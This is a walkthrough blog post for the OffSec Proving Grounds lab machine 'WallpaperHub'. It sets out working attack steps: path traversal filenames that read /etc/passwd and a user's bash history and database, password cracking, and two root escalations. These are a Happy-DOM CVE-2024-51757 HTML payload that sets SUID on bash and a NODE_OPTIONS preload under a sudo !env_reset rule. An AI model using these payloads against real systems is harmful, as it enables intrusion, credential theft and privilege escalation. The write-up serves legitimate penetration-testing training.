---
title: "[OSCP-Like] - OffSec - Proving Grounds - WallpaperHub"
authors: Samarth
date: 2026-01-03
categories: [OffSec, Proving Grounds Practice]
tags: [Linux, Python, Flask, Werkzeug, LFI, Node.js, CVE-2024-51757]
math: true
mermaid: true
---

![WallpaperHub - OffSec](/assets/images/writeups/WallpaperHub-OffSec/banner.png)

## TL;DR

This writeup is based on the [WallpaperHub](https://portal.offsec.com/machine/wallpaperhub-192392/overview/details){:target="_blank"} machine. I began with an Nmap scan revealing **SSH (22)**, **HTTP (80)**, and a **Flask application (5000)**. Enumeration of the web app uncovered a file upload feature. I exploited a **Local File Inclusion (LFI)** vulnerability via filename manipulation to read the user's `.bash_history` and steal a SQLite database. After cracking the extracted hash, I gained SSH access as `wp_hub`. Finally, I exploited a `sudo` misconfiguration (`!env_reset`) combined with a vulnerable **Node.js** script to escalate privileges to **Root**, demonstrating two distinct methods: **Environment Injection** and a **Happy-DOM RCE (CVE-2024-51757)**.

## Scanning Network

I began with an Nmap scan to identify open ports and running services.

```bash
sudo nmap -sS -sV -sC -T4 -p- -v -oN scans/fullport.scan 192.168.122.204
Nmap scan report for 192.168.122.204
Host is up (0.065s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2:5a:a9:66:65:3e:d0:b8:9d:a5:16:8c:e8:16:37:e2 (ECDSA)
|_  256 9b:2d:1d:f8:13:74:ce:96:82:4e:19:35:f9:7e:1b:68 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
5000/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.12.3)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Wallpaper Hub - Home
|_http-server-header: Werkzeug/3.0.1 Python/3.12.3
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan revealed three open ports:

* **22 (SSH)**: Standard OpenSSH service.

* **80 (HTTP)**: `Apache` web server showing the default Ubuntu landing page.

* **5000 (HTTP)**: A Python-based web server (Werkzeug/Flask) hosting the application `**Wallpaper Hub - Home**`.

## Enumeration

I navigated to `http://192.168.122.204:5000` to inspect the main application running on the Flask server.

![WallpaperHub](/assets/images/writeups/WallpaperHub-OffSec/1.png)

The application appeared to be a wallpaper gallery. I noticed a **Login** and **Register** page. Since I did not have credentials, I navigated to the `/register` endpoint to create a new account.

![Register Page](/assets/images/writeups/WallpaperHub-OffSec/2.png)

I successfully registered a new user with the credentials `test:test` and logged in.

Upon successful authentication, I was redirected to the Dashboard. The dashboard confirmed my access ("Welcome, test") and revealed several authenticated features:

* **Upload Wallpaper**: A functionality to upload files.

* **My Uploads**: A gallery to view user-uploaded content.

* **Explore Gallery**: A public view of wallpapers.

![Dashboard](/assets/images/writeups/WallpaperHub-OffSec/3.png)

This confirmed that the application allows file uploads for authenticated users, which became my primary vector for exploitation.

## Exploitation

My first instinct upon finding a file upload feature was to attempt arbitrary code execution by uploading a malicious script. Given that web shells are a common vector, I generated a standard bash shell.

I uploaded the file `shell.php`, and changed the `Content-Type` to `image/jpeg` so the application accept it without any validation errors. 

![Uploading shell](/assets/images/writeups/WallpaperHub-OffSec/4.png)

However, when I navigated to the "My Uploads" section to trigger the shell, I found that clicking the file only initiated a download of the text file rather than executing it.

![Shell Uploaded](/assets/images/writeups/WallpaperHub-OffSec/5.png)

Realizing that direct code execution via file content was unlikely, I shifted my focus to how the application handled the **filenames** themselves. If the application was using the filename provided by the user to fetch the file from the disk without sanitization, it might be vulnerable to **Path Traversal**.

I intercepted the upload request using Burp Suite and modified the `filename` parameter to point to the system's password file, attempting to traverse out of the upload directory.

```bash
Content-Disposition: form-data; name="file"; filename="../../../../../../etc/passwd"
Content-Type: image/jpeg
```

I forwarded the request, and the application accepted the upload. When I went to the "My Uploads" page and clicked the download button for this "image," the server returned the contents of /etc/passwd instead of an image.

![Burp Request](/assets/images/writeups/WallpaperHub-OffSec/6.png)

The output revealed a specific user named `wp_hub` with a home directory at `/home/wp_hub`.

I decided to check for sensitive files in the user's home directory. I targeted the `.bash_history` file, which often contains typed commands that might reveal passwords, script locations, or other sensitive configuration details.

I repeated the LFI process using a new payload targeting the history file.

```bash
Content-Disposition: form-data; name="file"; filename="../../../../../../home/wp_hub/.bash_history"
Content-Type: image/jpeg
```

![Bash History](/assets/images/writeups/WallpaperHub-OffSec/7.png)

The server returned the content of the history file:

```bash
sqlite3 ~/wallpaper_hub/database.db
```

Knowing the location of the database, I used the LFI vulnerability again to download the `database.db` file to my local machine.

```bash
Content-Disposition: form-data; name="file"; filename="../../../../../../home/wp_hub/wallpaper_hub/database.db"
```

![Database](/assets/images/writeups/WallpaperHub-OffSec/8.png)

After downloading the file, I inspected it using the sqlite3 command-line tool. I dumped the content of the database.

![Dumped Data](/assets/images/writeups/WallpaperHub-OffSec/9.png)

The database contained a password hash for the user `wp_hub`. I saved this hash to a file named `wp_hub.hash` and used John the Ripper to crack it using the rockyou.txt wordlist.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt wp_hub.hash
```

John successfully cracked the hash, revealing the password:

```bash
?:qazwsxedc
1 password hash cracked, 0 left
```

With the valid credentials, I logged into the target machine via SSH.

```bash
ssh wp_hub@192.168.122.204
password: qazwsxedc
```
I successfully gained a shell as the `wp_hub` user.

```bash
wp_hub@wallpaperhub:~$ id
uid=1001(wp_hub) gid=1001(wp_hub) groups=1001(wp_hub)
```

## Post Exploitation

I checked for standard vectors like `sudo -l` permissions and SUID binaries.

![sudo -l](/assets/images/writeups/WallpaperHub-OffSec/10.png)

### Method 1: Happy-DOM RCE

I analyzed the `/usr/bin/web-scraper` script and noticed it uses the `happy-dom` library to parse HTML. Research indicated that older versions of happy-dom are vulnerable to [Arbitrary Code Execution (CVE-2024-51757)](https://security.snyk.io/vuln/SNYK-JS-HAPPYDOM-8350065){:target="_blank"}  via the `src` attribute of `<script>` tags.

![happy-dom](/assets/images/writeups/WallpaperHub-OffSec/11.png)

The vulnerability exists because `happy-dom` evaluates JavaScript inside the `src` attribute to construct the URL. Since the library runs in a Node.js environment, this allows for the execution of system commands.

I created a malicious HTML file (`exploit_cve.html`). To bypass URL encoding (which converts spaces to `%20` and breaks shell commands), I constructed the command string dynamically using `String.fromCharCode(32)` to represent spaces.

```html
<!DOCTYPE html>
<html>
<body>
<script src="http://localhost/x'+require('child_process').execSync('chmod'+String.fromCharCode(32)+'u+s'+String.fromCharCode(32)+'/bin/bash')+'"></script>
</body>
</html>
```

I executed the scraper using `sudo`, pointing it to my malicious file:

```bash
sudo /usr/bin/web-scraper /root/web_src_downloaded/../../home/wp_hub/exploit_cve.html
```

The script parsed the HTML, executed the injected Node.js code, and added the SUID bit to `/bin/bash`.

![Root Shell](/assets/images/writeups/WallpaperHub-OffSec/12.png)

### Method 2: Environment Injetion (NODE_OPTIONS)

Since the allowed binary `/usr/bin/web-scraper` is a Node.js script and `!env_reset` is enabled, I could exploit this by injecting the `NODE_OPTIONS` environment variable. This variable allows users to pass command-line arguments to the Node.js process via the environment.

I created a payload that spawns a shell and saved it to `/tmp/root.js`:

```bash
require('child_process').spawn('/bin/bash', {stdio: 'inherit'});
```

I then executed the sudo command, setting `NODE_OPTIONS` to preload my malicious script using the `--require` flag. I used a path traversal payload (`
.../fake.html`) to satisfy the sudoers wildcard requirement.

```bash
sudo NODE_OPTIONS='--require /tmp/root.js' /usr/bin/web-scraper /root/web_src_downloaded/fake.html
```

The Node.js process loaded my script with root privileges before executing the main application, granting me an immediate root shell.

![Root Shell](/assets/images/writeups/WallpaperHub-OffSec/13.png)

The **WallpaperHub** machine demonstrated the danger of relying on filename input for file operations without sanitization, which led to full system disclosure via LFI. Furthermore, it highlighted the risks of relaxed sudo configurations (`!env_reset`), which can turn even harmless scripts into privilege escalation vectors. Finally, it served as a practical example of CVE-2024-51757, showing how server-side DOM implementations can be tricked into executing arbitrary system commands.

Thanks for reading this far. If you enjoyed the writeup, do support me [here](https://www.buymeacoffee.com/h4xplo1t){:target="_blank"}.